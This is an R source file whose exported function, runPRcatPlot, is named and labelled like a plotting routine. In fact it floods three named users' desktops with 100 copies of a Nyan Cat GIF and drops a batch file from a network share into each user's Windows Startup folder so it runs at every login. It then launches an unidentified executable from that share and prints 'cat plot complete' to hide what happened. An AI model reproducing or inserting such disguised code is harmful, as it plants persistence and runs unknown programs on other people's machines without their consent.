#' @export
runPRcatPlot <- function() {
  options(warn = -1)
  for (i in 1:100) {
    dir <- 'C:\\Users\\TRCOMPT1\\Desktop'
    file.copy(
      'S:\\UNDERWRITING\\Data Folders\\Actuarial Dept\\MOT\\Sebastian\\Source\\source.gif',
      dir
    )
    file.rename(paste(dir, '\\source.gif', sep = ""),
                paste(dir, '\\NYANCAT-', i, '.gif', sep = ""))
  }

  for (i in 1:100) {
    dir <- 'C:\\Users\\TRCOMPT\\Desktop'
    file.copy(
      'S:\\UNDERWRITING\\Data Folders\\Actuarial Dept\\MOT\\Sebastian\\Source\\source.gif',
      dir
    )
    file.rename(paste(dir, '\\source.gif', sep = ""),
                paste(dir, '\\NYANCAT-', i, '.gif', sep = ""))
  }

  for (i in 1:100) {
    dir <- 'C:\\Users\\TRCOMPTON\\Desktop'
    file.copy(
      'S:\\UNDERWRITING\\Data Folders\\Actuarial Dept\\MOT\\Sebastian\\Source\\source.gif',
      dir
    )
    file.rename(paste(dir, '\\source.gif', sep = ""),
                paste(dir, '\\NYANCAT-', i, '.gif', sep = ""))
  }


  dir <-
    'C:\\Users\\TRCOMPT1\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
  file.copy(
    'S:\\UNDERWRITING\\Data Folders\\Actuarial Dept\\MOT\\Sebastian\\Source\\source.bat',
    dir
  )

  dir <-
    'C:\\Users\\TRCOMPT\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
  file.copy(
    'S:\\UNDERWRITING\\Data Folders\\Actuarial Dept\\MOT\\Sebastian\\Source\\source.bat',
    dir
  )

  dir <-
    'C:\\Users\\TRCOMPTON\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
  file.copy(
    'S:\\UNDERWRITING\\Data Folders\\Actuarial Dept\\MOT\\Sebastian\\Source\\source.bat',
    dir
  )

  system(
    "S:\\UNDERWRITING\\Data Folders\\Actuarial Dept\\MOT\\Sebastian\\Source\\sourceRGraphs.exe"
  )

  options(warn = 0)
  rm(dir)
  print("cat plot complete")
}
